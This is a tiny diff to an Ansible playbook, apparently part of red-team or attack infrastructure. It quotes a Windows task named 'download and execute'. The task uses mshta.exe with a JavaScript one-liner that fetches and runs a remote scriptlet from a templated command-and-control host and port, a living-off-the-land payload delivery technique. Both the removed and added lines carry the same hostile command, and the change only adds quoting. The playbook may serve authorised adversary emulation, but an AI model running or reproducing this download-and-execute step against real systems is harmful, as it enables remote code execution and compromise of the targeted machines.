@@ -6,4 +6,4 @@
    - /opt/ansible/vars.yaml
   tasks:
     - name: download and execute
-      win_command: mshta.exe javascript:a=(GetObject('script:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }}')).Exec();close();
+      win_command: "mshta.exe javascript:a=(GetObject('script:http://{{ cnc_fqdn }}:{{ cnc_port}}/{{ cnc_sct }}')).Exec();close();"
